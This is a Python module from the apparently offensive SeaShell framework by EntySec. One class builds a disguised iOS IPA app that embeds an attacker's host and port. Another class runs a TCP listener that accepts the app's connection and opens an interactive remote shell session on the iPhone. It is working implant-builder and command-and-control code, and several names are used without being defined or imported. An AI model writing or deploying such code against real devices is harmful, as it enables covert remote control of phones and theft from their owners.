"""
MIT License

Copyright (c) 2020-2023 EntySec

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import os
import shutil
import plistlib

from pex.string import String
from pex.proto.tcp import TCPListener
from pwny.session import PwnySession

from badges import Badges
from colorscript import ColorScript


class DeviceGenerator(object):
    """ Subclass of seashell.core module.

    This subclass of seashell.core module is intended for providing
    an implementation of device generator.
    """

    def __init__(self, host: str, port: int) -> None:
        """ Initialize device generator.

        :param str host: host
        :param int port: port
        :return None: None
        """

        self.data_path = f'{os.path.dirname(os.path.dirname(__file__))}/data/'

        self.host = host
        self.port = port

        self.hash = String().base64_string(
            f'{host}:{str(port)}', decode=True)

        self.app_name = 'Mussel'
        self.bundle_id = 'com.entysec.mussel'
        self.binary_name = 'main'

    def set_name(self, name: str, bundle_id: str) -> None:
        """ Set application name.

        :param str name: name of application
        :param str bundle_id: bundle id (e.g. com.entysec.dummy)
        :return None: None
        """

        self.app_name = name.lower().title()
        self.bundle_id = bundle_id

    def generate(self, path: str) -> None:
        """ Generate IPA.

        :param str path: path to save ipa
        :return None: None
        """

        self.craft_plist()
        self.build_ipa(path)

    def build_ipa(self, path: str) -> None:
        """ Build IPA.

        :param str path: path to save ipa
        :return None: None
        """

        if not os.path.isdir(path):
            path = os.path.split(path)[0]

        payload = path + '/Payload/'
        archive = path + '/' + self.app_name + '.ipa'

        os.mkdir(payload)
        shutil.copytree(self.data_path + 'Mussel.app', payload + 'Mussel.app')
        shutil.make_archive(archive, 'zip', payload)
        shutil.move(archive + '.zip', archive)
        shutil.rmtree(payload)

    def craft_plist(self) -> None:
        """ Craft plist file.

        :return None: None
        """

        plist_path = (
                self.data_path +
                'Mussel.app/Info.plist'
        )

        plist = {
            'CFBundleBase64Hash': self.hash,
            'CFBundleDevelopmentRegion': 'en',
            'CFBundleDisplayName': self.app_name,
            'CFBundleExecutable': self.binary_name,
            'CFBundleIdentifier': self.bundle_id,
            'CFBundleInfoDictionaryVersion': '6.0',
            'CFBundleName': self.app_name,
            'CFBundlePackageType': 'APPL',
            'CFBundleShortVersionString': '1.0.0',
            'CFBundleSignature': '????',
            'CFBundleVersion': '1',
            'LSRequiresIPhoneOS': True,
            'UISupportedInterfaceOrientations': [
                'UIInterfaceOrientationPortrait',
                'UIInterfaceOrientationPortraitUpsideDown',
                'UIInterfaceOrientationLandscapeLeft',
                'UIInterfaceOrientationLandscapeRight'
            ]
        }

        with open(plist_path, 'wb') as f:
            plistlib.dump(plist, f)


class Device(object):
    """ Subclass of seashell.core module.

    This subclass of seashell.core module is intended for providing
    an implementation of device controller.
    """

    def __init__(self, session: PwnySession) -> None:
        """ Initialize device.

        :param PwnySession: Pwny session
        :return None: None
        """

        super().__init__()

        self.badges = Badges()
        self.tables = Tables()
        self.loader = Loader()

        self.device = session

        self.host = self.device.details['Host']
        self.port = self.device.details['Port']

        self.device.prompt = ColorScript().parse(
            f'%remove(seashell: %blue{self.host}%end)> ')

    def kill(self) -> None:
        """ Disconnect the specified device.

        :return None: None
        """

        self.device.close()

    def interact(self) -> None:
        """ Interact with the specified device.

        :return None: None
        """

        self.badges.print_success("Interactive connection spawned!")

        self.badges.print_empty("")
        self.device.interact()


class DeviceHandler(TCPListener):
    """ Subclass of seashell.core module.

    This subclass of seashell.core module is intended for providing
    an implementation of device handler.
    """

    def __init__(self, host: str, port: int, timeout: int = 10) -> None:
        """ Start TCP listener on socket pair.

        :param str host: host to listen
        :param int port: port to listen
        :param int timeout: listener timeout
        :return None: None
        """

        super().__init__(host, port, timeout)

        self.badges = Badges()

    def start(self) -> None:
        """ Start TCP listener.

        :return None: None
        """

        self.badges.print_process(f"Listening on TCP port {str(self.port)}...")
        self.listen()

    def handle(self) -> Device:
        """ Accept connection and wrap it with Device.

        :return Device: device instance
        """

        self.accept()

        session = PwnySession()
        session.details.update({
            'Platform': OS_IPHONE,
            'Arch': ARCH_AARCH64,
            'Host': self.address[0],
            'Port': self.port,
        })
        session.open(self.client, loader=False)

        self.badges.print_success(
            f"New device connected {self.address[0]}:{str(self.port)}!")

        return Device(session)
